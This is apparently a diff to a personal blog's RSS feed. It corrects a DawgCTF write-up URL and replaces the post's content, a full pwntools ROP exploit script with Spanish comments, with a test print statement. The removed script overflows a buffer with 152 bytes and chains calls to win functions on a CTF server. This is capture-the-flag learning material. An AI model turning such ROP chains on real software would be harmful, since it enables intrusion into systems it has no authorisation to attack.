@@ -10,78 +10,12 @@
         
         <item>
             <title>64 bits in my ark and texture</title>
-            <link>https://pablo10diez2.github.io/webPablo/posts/dawfctf/reversing-64-bits-in-my-ark-and-texture/</link>
+            <link>https://pablo10diez2.github.io/webPablo/posts/dawgctf/reversing-64-bits-in-my-ark-and-texture/</link>
             <pubDate>Mon, 21 Apr 2025 00:00:00 +0000</pubDate>
             
-            <guid>https://pablo10diez2.github.io/webPablo/posts/dawfctf/reversing-64-bits-in-my-ark-and-texture/</guid>
-            <description>from pwn import * # Se carga chall como un archivo ELF, se pone checksec a False para ahorrar el tiempo de ese proceso # si ya se sabe el resultado (checksec --file=./chall en ubuntu por ejemplo) elf = ELF(&amp;#34;./chall&amp;#34;, checksec=False) # Recomendable hacer esto, así le indicamos a pwntools que el contexto en el que vamos a estar # trabajando es x86 64bit, endian... context.binary = elf # Abrimos también la conexión remota p = remote(&amp;#34;connect.</description>
-            <content type="html"><![CDATA[<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Se carga chall como un archivo ELF, se pone checksec a False para ahorrar el tiempo de ese proceso</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># si ya se sabe el resultado (checksec --file=./chall en ubuntu por ejemplo)</span>
-</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Recomendable hacer esto, así le indicamos a pwntools que el contexto en el que vamos a estar</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># trabajando es x86 64bit, endian...</span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Abrimos también la conexión remota</span>
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;connect.umbccd.net&#34;</span>, <span style="color:#ae81ff">22237</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mandamos las respuestas de las primeras preguntas</span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Los 3 payloads se van a hacer seguidos, es decir, no es necesario hacer 3 buffer overflows diferentes,</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># una vez se hace el primero podemor ir metiendo las direcciones de return en el stack y las instrucciones se iran ejecutando</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># una tras otra. Por eso en este programa se hace todo seguido y luego se manda con rop.chain().</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#-------PAYLOAD-1----------</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creamos un objeto ROP (Return Oriented Programming) para contruir el payload, el payload se construye con el</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># binario local (elf) y una vez está hecho se manda al remoto (p).</span>
-</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rellenamos con 152 letras, justo antes de llegar al return address</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">152</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Este find_gadget se hace para alinear la pila, es decir a priori no parece necesario, ya has hecho el buffer overflow</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># y harias call de &#39;win1&#39;, aunque puede funcionar no es recomendable hacerlo directamente. Por eso se utiliza esto, para</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># que el puntero del return address sea multiplo de 16 y así estar alineado.</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#39;win1&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">```</span>python
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#-------PAYLOAD-2----------</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hacemos prácticamente lo mismo, solo que añadimos el primer parametro en rdi</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win2&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#-------PAYLOAD-3----------</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeafface</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfeedcafe</span>
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])<span style="color:#f92672">.</span>address))
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;win3&#34;</span>)
-</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74">&#34;exit&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Mandamos el payload</span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Continue:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Test:&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+            <guid>https://pablo10diez2.github.io/webPablo/posts/dawgctf/reversing-64-bits-in-my-ark-and-texture/</guid>
+            <description>print(&amp;#34;Prueba&amp;#34;) </description>
+            <content type="html"><![CDATA[<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Prueba&#34;</span>)
 </span></span></code></pre></div>]]></content>
         </item>
         
